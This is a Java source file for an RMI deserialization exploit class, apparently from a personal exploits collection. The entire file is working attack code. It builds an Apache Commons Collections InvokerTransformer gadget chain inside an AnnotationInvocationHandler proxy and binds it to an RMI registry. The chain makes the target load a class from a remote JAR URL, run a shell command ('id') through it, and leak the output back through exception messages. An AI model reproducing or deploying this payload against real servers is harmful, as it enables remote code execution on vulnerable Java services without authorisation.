package nth347.exploits;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class RMIClassLoaderExploit {

    public static Constructor<?> getFirstCtor(final String name) throws Exception {
        final Constructor <?> constructor = Class.forName(name).getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        return constructor;
    }

    public static void main(String[] args) throws Exception {
        String IP = "127.0.0.1";
        int PORT = 1099;
        final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

        try {
            String JAR_URL = "http://127.0.0.1:8000/";
            String COMMAND = "id";
            final Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(java.net.URLClassLoader.class),
                    new InvokerTransformer(
                            "getConstructor",
                            new Class[] {Class[].class},
                            new Object[] {new Class[] {java.net.URL[].class}}
                    ),
                    new InvokerTransformer(
                            "newInstance",
                            new Class[] {Object[].class},
                            new Object[] {new Object[] {new java.net.URL[] {new java.net.URL(JAR_URL)}}}
                    ),
                    new InvokerTransformer(
                            "loadClass",
                            new Class[] {String.class},
                            new Object[] {"ErrorBasedExec"}
                    ),
                    new InvokerTransformer(
                            "getMethod",
                            new Class[] {String.class, Class[].class},
                            new Object[] {"do_exec", new Class[] {String.class}}),
                    new InvokerTransformer(
                            "invoke",
                            new Class[] {Object.class, Object[].class},
                            new Object[] {null, new String[] {COMMAND}})
            };
            Transformer chainedTransformer = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            innerMap.put("value", "value");
            Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            InvocationHandler h = (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Target.class, outerMap);

            Registry registry = LocateRegistry.getRegistry(IP, PORT);
            Remote r = Remote.class.cast(
                    Proxy.newProxyInstance(
                            Remote.class.getClassLoader(),
                            new Class[] {Remote.class},
                            h
                    )
            );
            registry.bind("danger", r);
        } catch (Exception e) {
            try {
                System.out.print(e.getCause().getCause().getCause().getMessage());
            } catch (Exception ee) {
                throw e;
            }
        }
    }
}
